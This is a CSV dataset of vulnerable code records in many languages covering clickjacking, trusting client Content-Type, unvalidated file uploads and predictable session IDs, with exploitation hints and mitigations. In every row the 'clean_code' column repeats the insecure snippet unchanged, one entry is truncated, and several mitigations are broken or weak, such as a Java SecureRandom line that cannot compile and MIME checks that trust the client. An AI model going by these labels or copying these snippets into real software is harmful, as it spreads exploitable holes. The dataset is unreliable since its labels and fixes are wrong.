id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-542,Ruby,Clickjacking,Missing X-Frame-Options header.,get '/' do 'Page' end,Embed site in iframe for clickjacking.,Set: response.headers['X-Frame-Options'] = 'DENY',get '/' do 'Page' end,False,False,False,False,21,False,True,False,Other,1
vuln-543,Go,Clickjacking,No X-Frame-Options header.,"http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Page"") })",Iframe site for clickjacking attacks.,"Set: w.Header().Set(""X-Frame-Options"", ""DENY"")","http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Page"") })",False,False,False,False,92,False,True,False,Other,1
vuln-544,C# (.NET),Clickjacking,Missing X-Frame-Options header.,"[HttpGet(""/"")] public IActionResult Index() { return Ok(""Page""); }",Embed in iframe for clickjacking.,"Set: Response.Headers.Add(""X-Frame-Options"", ""DENY"");","[HttpGet(""/"")] public IActionResult Index() { return Ok(""Page""); }",False,False,False,False,66,False,True,False,Other,1
vuln-545,Kotlin,Clickjacking,No X-Frame-Options header.,"get(""/"") { call.respondText(""Page"") }",Iframe site for clickjacking attacks.,"Set: call.response.header(""X-Frame-Options"", ""DENY"")","get(""/"") { call.respondText(""Page"") }",False,False,False,False,37,False,True,False,Other,1
vuln-546,Scala,Clickjacking,Missing X-Frame-Options header.,"get(""/"") { Ok(""Page"") }",Embed site in iframe for clickjacking.,"Set: Ok(""Page"").withHeaders(""X-Frame-Options"" -> ""DENY"")","get(""/"") { Ok(""Page"") }",False,False,False,False,23,False,True,False,Other,1
vuln-547,Rust,Clickjacking,No X-Frame-Options header.,"router.get(""/"", |_, res| res.render_text(""Page""))",Iframe site for clickjacking attacks.,"Set: res.header(""X-Frame-Options"", ""DENY"")","router.get(""/"", |_, res| res.render_text(""Page""))",False,False,False,False,49,False,True,False,Other,1
vuln-548,Elixir,Clickjacking,Missing X-Frame-Options header.,"get ""/"", PageController, :index # returns 'Page'",Embed in iframe for clickjacking.,"Set: put_resp_header(conn, ""x-frame-options"", ""DENY"")","get ""/"", PageController, :index # returns 'Page'",False,False,False,False,48,False,True,False,Other,1
vuln-549,Perl,Clickjacking,No X-Frame-Options header.,$r->print('Page');,Iframe site for clickjacking attacks.,Set: $r->headers_out->set('X-Frame-Options' => 'DENY');,$r->print('Page');,False,False,False,False,18,False,True,False,Other,1
vuln-550,Node.js,Insecure Content-Type Handling,Trusting client-supplied Content-Type headers.,if (req.headers['content-type'] === 'application/json') parseJson(req.body);,Spoof Content-Type to bypass parsing checks.,Validate payload: try { JSON.parse(req.body) } catch (e) { res.status(400); },if (req.headers['content-type'] === 'application/json') parseJson(req.body);,True,False,False,False,76,False,True,False,Other,1
vuln-551,Python,Insecure Content-Type Handling,Trusting Content-Type header for parsing.,if request.headers['Content-Type'] == 'application/json': json.loads(request.data),Spoof Content-Type to inject malicious data.,Validate: json.loads(request.data) if request.is_json else abort(400),if request.headers['Content-Type'] == 'application/json': json.loads(request.data),False,False,False,False,82,False,True,False,Other,1
vuln-552,Java,Insecure Content-Type Handling,Relying on client Content-Type header.,"if (request.getContentType().equals(""application/json"")) { parseJson(request.getInputStream()); }",Spoof Content-Type to bypass validation.,"Validate: try { objectMapper.readValue(request.getInputStream(), Object.class); } catch (Exception e) { ... }","if (request.getContentType().equals(""application/json"")) { parseJson(request.getInputStream()); }",True,False,False,False,97,False,True,False,Other,1
vuln-553,PHP,Insecure Content-Type Handling,Trusting Content-Type header.,if ($_SERVER['CONTENT_TYPE'] === 'application/json') { json_decode(file_get_contents('php://input')); },Spoof Content-Type to inject data.,Validate: $data = json_decode(file_get_contents('php://input')); if (json_last_error() === JSON_ERROR_NONE) { ... },if ($_SERVER['CONTENT_TYPE'] === 'application/json') { json_decode(file_get_contents('php:,True,False,False,False,103,False,True,False,Other,1
vuln-554,Ruby,Insecure Content-Type Handling,Relying on client-supplied Content-Type.,if request.content_type == 'application/json' then JSON.parse(request.body.read) end,Spoof Content-Type to bypass parsing.,Validate: JSON.parse(request.body.read) rescue render status: 400,if request.content_type == 'application/json' then JSON.parse(request.body.read) end,True,False,False,False,84,False,True,False,Other,1
vuln-555,Go,Insecure Content-Type Handling,Trusting Content-Type header for parsing.,"if r.Header.Get(""Content-Type"") == ""application/json"" { json.NewDecoder(r.Body).Decode(&data) }",Spoof Content-Type to inject malicious data.,"Validate: err := json.NewDecoder(r.Body).Decode(&data); if err != nil { http.Error(w, ""Invalid JSON"", 400) }","if r.Header.Get(""Content-Type"") == ""application/json"" { json.NewDecoder(r.Body).Decode(&data) }",True,False,False,False,95,False,True,False,Other,1
vuln-556,C# (.NET),Insecure Content-Type Handling,Relying on Content-Type header.,"if (Request.ContentType == ""application/json"") { JsonSerializer.Deserialize(Request.Body); }",Spoof Content-Type to bypass checks.,Validate: try { await JsonSerializer.DeserializeAsync(Request.Body); } catch { return BadRequest(); },"if (Request.ContentType == ""application/json"") { JsonSerializer.Deserialize(Request.Body); }",True,False,False,False,92,False,True,False,Other,1
vuln-557,Kotlin,Insecure Content-Type Handling,Trusting Content-Type header.,"if (call.request.contentType().toString() == ""application/json"") { call.receive<String>() }",Spoof Content-Type to inject data.,Validate: try { Json.decodeFromString(call.receive<String>()) } catch (e: Exception) { call.respond(HttpStatusCode.BadRequest) },"if (call.request.contentType().toString() == ""application/json"") { call.receive<String>() }",False,False,False,False,91,False,True,False,Other,1
vuln-558,Scala,Insecure Content-Type Handling,Relying on client Content-Type.,"if (request.contentType.contains(""application/json"")) { parse(request.body.asJson) }",Spoof Content-Type to bypass parsing.,Validate: parse(request.body.asJson).recover { case _ => BadRequest },"if (request.contentType.contains(""application/json"")) { parse(request.body.asJson) }",True,False,False,False,84,False,True,False,Other,1
vuln-559,Rust,Insecure Content-Type Handling,Trusting Content-Type header.,"if req.headers().get(""content-type"") == Some(&""application/json"".into()) { serde_json::from_reader(req.body()?) }",Spoof Content-Type to inject data.,Validate: serde_json::from_reader(req.body()?).map_err(|_| StatusCode::BAD_REQUEST),"if req.headers().get(""content-type"") == Some(&""application/json"".into()) { serde_json::from_reader(req.body()?) }",True,False,False,False,113,False,True,False,Other,1
vuln-560,Elixir,Insecure Content-Type Handling,Relying on Content-Type header.,"if get_req_header(conn, ""content-type"") == [""application/json""] do Jason.decode!(conn.body_params) end",Spoof Content-Type to bypass checks.,"Validate: case Jason.decode(conn.body_params) do {:ok, _} -> ...; {:error, _} -> send_resp(conn, 400, ""Invalid JSON"") end","if get_req_header(conn, ""content-type"") == [""application/json""] do Jason.decode!(conn.body_params) end",True,False,False,False,102,False,True,False,Other,1
vuln-561,Perl,Insecure Content-Type Handling,Trusting Content-Type header for parsing.,if ($r->header('Content-Type') eq 'application/json') { decode_json($r->content); },Spoof Content-Type to inject data.,Validate: eval { decode_json($r->content) } or $r->status(400);,if ($r->header('Content-Type') eq 'application/json') { decode_json($r->content); },False,False,False,False,83,False,True,False,Other,1
vuln-562,Node.js,Insecure File Upload,No validation of uploaded file types.,"app.post('/upload', (req, res) => { req.files.file.mv('uploads/' + req.files.file.name); });",Upload malicious files like .php scripts.,"Validate: if (['image/png', 'image/jpeg'].includes(req.files.file.mimetype)) { ... }","app.post('/upload', (req, res) => { req.files.file.mv('uploads/' + req.files.file.name); });",True,False,False,False,92,False,True,True,File_Handling,1
vuln-563,Python,Insecure File Upload,No validation of uploaded file types.,file = request.files['file']; file.save('uploads/' + file.filename),Upload executable scripts.,"Validate: if file.mimetype in ['image/png', 'image/jpeg']: file.save(...)",file = request.files['file']; file.save('uploads/' + file.filename),False,False,False,False,67,False,True,True,File_Handling,1
vuln-564,Java,Insecure File Upload,No validation of uploaded files.,"@PostMapping(""/upload"") public void upload(@RequestParam(""file"") MultipartFile file) { file.transferTo(new File(""uploads/"" + file.getOriginalFilename())); }",Upload malicious files.,"Validate: if (Arrays.asList(""image/png"", ""image/jpeg"").contains(file.getContentType())) { ... }","@PostMapping(""/upload"") public void upload(@RequestParam(""file"") MultipartFile file) { file.transferTo(new File(""uploads/"" + file.getOriginalFilename())); }",True,False,False,False,156,False,True,True,File_Handling,1
vuln-565,PHP,Insecure File Upload,No validation of uploaded file types.,"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",Upload executable scripts like .php.,"Validate: if (in_array($_FILES['file']['type'], ['image/png', 'image/jpeg'])) { ... }","move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",False,False,False,False,86,False,True,False,File_Handling,1
vuln-566,Ruby,Insecure File Upload,No validation of uploaded files.,"file = params[:file]; File.open(""uploads/#{file.original_filename}"", 'wb') { |f| f.write(file.tempfile) }",Upload malicious files.,Validate: if %w[image/png image/jpeg].include?(file.content_type) { ... },"file = params[:file]; File.open(""uploads/#{file.original_filename}"", 'wb') { |f| f.write(file.tempfile) }",True,False,True,False,105,False,True,False,File_Handling,1
vuln-567,Go,Insecure File Upload,No validation of uploaded file types.,"file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",Upload executable scripts.,"Validate: if slices.Contains([]string{""image/png"", ""image/jpeg""}, header.Header.Get(""Content-Type"")) { ... }","file, header, _ := r.FormFile(""file""); os.WriteFile(""uploads/""+header.Filename, file, 0644)",False,False,True,False,91,False,True,True,File_Handling,1
vuln-568,C# (.NET),Insecure File Upload,No validation of uploaded files.,"[HttpPost(""upload"")] public async Task Upload(IFormFile file) { await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream()); }",Upload malicious files.,"Validate: if (new[] {""image/png"", ""image/jpeg""}.Contains(file.ContentType)) { ... }","[HttpPost(""upload"")] public async Task Upload(IFormFile file) { await File.WriteAllBytesAsync(""uploads/"" + file.FileName, file.OpenReadStream()); }",False,False,True,False,147,False,True,True,File_Handling,1
vuln-569,Kotlin,Insecure File Upload,No validation of uploaded file types.,"val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",Upload executable scripts.,"Validate: if (file.contentType in listOf(""image/png"", ""image/jpeg"")) { ... }","val file = call.receiveMultipart().readPart() as FilePart; File(""uploads/${file.fileName}"").writeBytes(file.streamProvider().readAllBytes())",False,False,False,False,140,False,True,True,File_Handling,1
vuln-570,Scala,Insecure File Upload,No validation of uploaded files.,"val file = request.body.asMultipartFormData.get.file(""file""); Files.write(Paths.get(""uploads"", file.filename), file.ref)",Upload malicious files.,"Validate: if (List(""image/png"", ""image/jpeg"").contains(file.contentType)) { ... }","val file = request.body.asMultipartFormData.get.file(""file""); Files.write(Paths.get(""uploads"", file.filename), file.ref)",True,False,False,False,120,False,True,False,File_Handling,1
vuln-571,Rust,Insecure File Upload,No validation of uploaded file types.,"let file = req.multipart()?.next_field()?.unwrap(); fs::write(format!(""uploads/{}"", file.name()?), file.bytes()?)?;",Upload executable scripts.,"Validate: if [""image/png"", ""image/jpeg""].contains(&file.content_type()?) { ... }","let file = req.multipart()?.next_field()?.unwrap(); fs::write(format!(""uploads/{}"", file.name()?), file.bytes()?)?;",True,False,False,False,115,False,True,False,File_Handling,1
vuln-572,Elixir,Insecure File Upload,No validation of uploaded files.,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.tempfile)",Upload malicious files.,Validate: if file.content_type in ~w(image/png image/jpeg) do File.write(...) end,"file = params[""file""]; File.write(""uploads/#{file.filename}"", file.tempfile)",True,False,False,False,76,False,True,False,File_Handling,1
vuln-573,Perl,Insecure File Upload,No validation of uploaded file types.,"my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->filename"");",Upload executable scripts.,Validate: if ($file->type =~ /^image/(png|jpeg)$/) { ... },"my $file = $r->upload('file'); open(my $fh, '>', ""uploads/$file->filename"");",False,False,True,False,76,False,True,False,File_Handling,1
vuln-574,Node.js,Insecure Session ID Generation,Predictable session IDs.,const sessionId = Date.now() + '-' + Math.random();,Predict session IDs to hijack sessions.,Use crypto.randomBytes(32).toString('hex'),const sessionId = Date.now() + '-' + Math.random();,False,False,False,False,51,False,True,True,Authentication,1
vuln-576,Java,Insecure Session ID Generation,Predictable session IDs.,"String sessionId = System.currentTimeMillis() + ""-"" + new Random().nextInt(1000);",Predict IDs to hijack sessions.,Use SecureRandom: new SecureRandom().nextBytes(new byte[32]).toString(),"String sessionId = System.currentTimeMillis() + ""-"" + new Random().nextInt(1000);",False,False,False,True,81,False,True,True,Authentication,1
